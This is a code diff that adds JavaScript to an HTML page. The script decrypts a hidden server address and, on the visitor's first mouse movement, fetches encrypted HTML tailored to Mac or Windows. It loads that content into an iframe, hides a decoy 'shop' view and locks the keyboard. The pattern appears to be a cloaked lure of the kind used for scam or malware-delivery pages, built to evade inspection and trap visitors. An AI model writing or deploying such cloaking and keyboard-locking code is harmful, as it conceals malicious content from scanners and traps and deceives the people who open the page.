+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
